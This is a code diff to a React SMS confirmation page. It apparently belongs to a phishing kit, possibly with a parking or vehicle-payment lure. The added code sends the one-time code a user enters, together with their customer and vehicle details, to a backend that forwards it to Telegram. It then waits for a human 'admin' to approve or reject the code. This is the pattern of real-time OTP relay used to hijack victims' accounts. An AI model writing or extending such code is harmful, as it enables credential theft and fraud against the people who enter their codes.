@@ -3,18 +3,22 @@ import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
-import { ArrowLeft, MessageSquare, Clock, TestTube2 } from "lucide-react";
+import { ArrowLeft, MessageSquare, Clock, Loader2 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
+import { useToast } from "@/hooks/use-toast";
 
 const SmsConfirmationPage = () => {
   const navigate = useNavigate();
   const location = useLocation();
+  const { toast } = useToast();
   const [code, setCode] = useState("");
   const [timeRemaining, setTimeRemaining] = useState(300); // 5 minutes
   const [isVerifying, setIsVerifying] = useState(false);
   const [isSending, setIsSending] = useState(false);
   const [error, setError] = useState("");
   const [actualSmsCode, setActualSmsCode] = useState("");
+  const [verificationId, setVerificationId] = useState("");
+  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
 
   useEffect(() => {
     // Check if we have the required data
@@ -52,34 +56,98 @@ const SmsConfirmationPage = () => {
     }
 
     setIsVerifying(true);
+    setWaitingForAdmin(true);
     setError("");
 
-    // Simulate verification delay
-    setTimeout(() => {
-      // Check against actual SMS code if available, otherwise accept any 6-digit code
-      if (actualSmsCode && code === actualSmsCode) {
-        // Analytics event
-        if (window.gtag) {
-          window.gtag('event', 'sms_verified');
+    try {
+      // Send verification request to Telegram with admin buttons
+      const { data, error } = await supabase.functions.invoke('verify-sms', {
+        body: {
+          userId: location.state.userId,
+          code: code,
+          customerInfo: location.state.customerInfo,
+          vehicle: location.state.vehicle,
+          duration: location.state.duration
         }
+      });
 
-        navigate('/push-confirmation', {
-          state: location.state
-        });
-      } else if (!actualSmsCode && code.length === 6) {
-        // Fallback for demo purposes
-        if (window.gtag) {
-          window.gtag('event', 'sms_verified');
-        }
-
-        navigate('/push-confirmation', {
-          state: location.state
-        });
-      } else {
-        setError("Invalid verification code. Please try again.");
-        setIsVerifying(false);
+      if (error) {
+        throw error;
       }
-    }, 1500);
+
+      if (data.success) {
+        setVerificationId(data.verificationId);
+        
+        // Start polling for admin response
+        const pollForResponse = setInterval(async () => {
+          try {
+            const { data: statusData, error: statusError } = await supabase.functions.invoke('check-verification-status', {
+              body: { verificationId: data.verificationId }
+            });
+
+            if (statusError) {
+              console.error('Error checking verification status:', statusError);
+              return;
+            }
+
+            if (statusData.status === 'approved') {
+              clearInterval(pollForResponse);
+              setWaitingForAdmin(false);
+              setIsVerifying(false);
+
+              // Analytics event
+              if (window.gtag) {
+                window.gtag('event', 'sms_verified');
+              }
+
+              navigate('/push-confirmation', {
+                state: location.state
+              });
+            } else if (statusData.status === 'rejected') {
+              clearInterval(pollForResponse);
+              setWaitingForAdmin(false);
+              setIsVerifying(false);
+              
+              toast({
+                variant: "destructive",
+                title: "Verification Failed",
+                description: "Wrong verification code. Please try again.",
+              });
+              
+              setCode("");
+            }
+          } catch (error) {
+            console.error('Error polling verification status:', error);
+          }
+        }, 2000); // Poll every 2 seconds
+
+        // Clear polling after 5 minutes
+        setTimeout(() => {
+          clearInterval(pollForResponse);
+          if (waitingForAdmin) {
+            setWaitingForAdmin(false);
+            setIsVerifying(false);
+            toast({
+              variant: "destructive",
+              title: "Verification Timeout",
+              description: "Verification request timed out. Please try again.",
+            });
+          }
+        }, 300000); // 5 minutes
+
+      } else {
+        throw new Error(data.message || "Failed to send verification request");
+      }
+    } catch (error) {
+      console.error('Error verifying code:', error);
+      setIsVerifying(false);
+      setWaitingForAdmin(false);
+      toast({
+        variant: "destructive",
+        title: "Verification Error",
+        description: "Failed to verify code. Please try again.",
+      });
+    }
   };
 
   const sendSmsCode = async (testType?: 'success' | 'error') => {
@@ -192,7 +260,14 @@ const SmsConfirmationPage = () => {
                 disabled={code.length !== 6 || isVerifying}
                 className="btn-irish w-full text-lg py-4"
               >
-                {isVerifying ? "Verifying Code..." : "Verify Code"}
+                {isVerifying ? (
+                  <div className="flex items-center gap-2">
+                    <Loader2 className="w-4 h-4 animate-spin" />
+                    {waitingForAdmin ? "Waiting for Admin Confirmation..." : "Verification"}
+                  </div>
+                ) : (
+                  "Verify Code"
+                )}
               </Button>
 
               <div className="text-center space-y-4">
